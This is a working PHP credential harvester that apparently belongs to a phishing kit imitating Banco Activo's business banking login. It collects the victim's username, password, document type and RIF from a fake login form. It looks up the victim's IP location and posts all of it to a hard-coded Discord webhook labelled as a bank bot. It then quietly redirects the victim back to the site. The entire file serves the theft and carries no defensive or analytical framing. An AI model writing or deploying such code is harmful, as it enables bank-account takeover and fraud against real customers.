<?php
session_start();

$username = isset($_POST['username']) ? trim($_POST['username']) : 'No especificado';
$password = isset($_POST['password']) ? trim($_POST['password']) : 'No especificada';
$doctype = isset($_POST['doctype']) ? trim($_POST['doctype']) : 'No especificado';
$rif = isset($_POST['rif']) ? trim($_POST['rif']) : 'No especificada';

$_SESSION['username'] = $username;
$_SESSION['password'] = $password;
$_SESSION['doctype'] = $doctype;
$_SESSION['rif'] = $rif;

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();

$detalle_ip = @file_get_contents("http://ip-api.com/json/$ip");
$detalle_ip = json_decode($detalle_ip, true);

$country = $region = $city = "Desconocido";
if ($detalle_ip && $detalle_ip['status'] === 'success') {
    $country = $detalle_ip['country'];
    $region  = $detalle_ip['regionName'];
    $city    = $detalle_ip['city'];
}

$uniqueId = strtoupper(substr(md5($ip), 0, 4));
$mapLink  = "https://www.google.com/maps/search/?api=1&query=$ip";

$data = [
    "content" => "🔐 **TAN CAYENDO (BANCO ACTIVO)** 🔐",
    "embeds" => [
        [
            "title" => "CUENTA EMPRESAS🏬",
            "color" => 3447003,
            "fields" => [
                [
                    "name" => "🆔 Tipo:",
                    "value" => $doctype,
                    "inline" => true
                ],
                [
                    "name" => "🏦 RIF:",
                    "value" => $rif,
                    "inline" => true
                ],
                [
                    "name" => "👤 Usuario:",
                    "value" => $username,
                    "inline" => false
                ],
                [
                    "name" => "🔑 Contraseña:",
                    "value" => $password,
                    "inline" => true
                ],
                [
                    "name" => "📌 IP:",
                    "value" => $ip,
                    "inline" => false
                ],
                [
                    "name" => "📍 Ciudad:",
                    "value" => $city,
                    "inline" => true
                ],
                [
                    "name" => "🗺️ Región:",
                    "value" => $region,
                    "inline" => true
                ],
                [
                    "name" => "🌎 País:",
                    "value" => $country,
                    "inline" => true
                ],
                [
                    "name" => "📅 Fecha:",
                    "value" => date('d-m-Y H:i:s'),
                    "inline" => false
                ],
                [
                    "name" => "#️⃣ ID de Usuario:",
                    "value" => "#$uniqueId",
                    "inline" => false
                ]
            ]
        ]
    ],
    "username" => "Banco Activo Bot"
];

$webhookUrl = "https://discord.com/api/webhooks/1359316935682297886/_U0RICZb0WDAfGDYDYrfJUOvUVis-pV80eP2owktMuIUq7yOiKlm8BjmdJrf5R9nsa5v";

$options = [
    "http" => [
        "header"  => "Content-Type: application/json\r\n",
        "method"  => "POST",
        "content" => json_encode($data)
    ]
];

$context = stream_context_create($options);
@file_get_contents($webhookUrl, false, $context);

header("Location: ../../index.html");
exit;
?>
